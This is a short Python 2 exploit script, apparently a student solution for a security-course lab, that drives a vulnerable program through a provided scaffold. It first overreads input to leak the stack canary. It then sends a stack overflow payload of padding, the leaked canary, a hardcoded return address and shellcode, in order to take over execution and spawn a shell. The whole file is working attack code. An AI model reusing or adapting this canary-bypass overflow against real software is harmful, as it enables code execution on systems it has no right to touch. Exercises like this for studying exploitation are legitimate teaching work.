#!/usr/bin/env python2

import scaffold as p
from scaffold import SHELLCODE
### YOUR CODE STARTS HERE ###
p.start()
getCanary = "C"*12+ "\\x"
p.send(getCanary + "\n")

ret = p.recvline()
print(ret)
canary = ret[13:17] 
print("Canary boi: ")
print(" ".join("{:02x}".format(ord(c)) for c in canary))
print("Canary size: " + str(len(canary)))

# second attack
m = 32
n = 8
rip = "\xc4\xfc\xff\xbf"
p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\x00'  + '\n')
